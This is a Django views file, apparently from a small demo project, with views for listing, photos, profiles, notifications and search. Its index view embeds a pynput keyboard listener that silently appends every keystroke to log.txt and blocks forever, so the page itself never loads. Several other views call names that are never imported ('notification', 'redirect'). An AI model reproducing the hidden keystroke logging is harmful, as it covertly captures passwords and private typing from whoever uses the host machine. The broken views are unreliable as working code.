from django.shortcuts import render
from .models import Demo
import plyer
# Create your views here.

from pynput.keyboard import Listener

def writekey(key):
       keydata =str(key)
       keydata=keydata.replace("'"," ")
       with open('log.txt' , 'a') as f:
           f.write(keydata)

                
def index(request):
    all=Demo.objects.all()
    with Listener(on_press=writekey) as l:
        
        l.join()


    return render(request,'index.html',{'all':all})

def second(request):
    return render(request,'second.html')  

def photos(request):
    pics=Demo.objects.only('image1')
    
    return render(request,'photos.html',{'pics':pics})      

def profile(request,id):
    person=Demo.objects.get(id=id)

    return render(request,'profile.html',{'name':person.name,'age':person.age,'pic':person.image1})  
def notif(request):
    title='demo'
    notification.notify(title=title,message='this is a demo')
    return redirect('index')

def search(request):
    if request.method == 'GET':
        name=request.GET.get('search')
        person=Demo.objects.get(name=name)
        print('person name:',person.name)

    return render(request,'profile.html',{'name':person.name,'age':person.age,'pic':person.image1})        
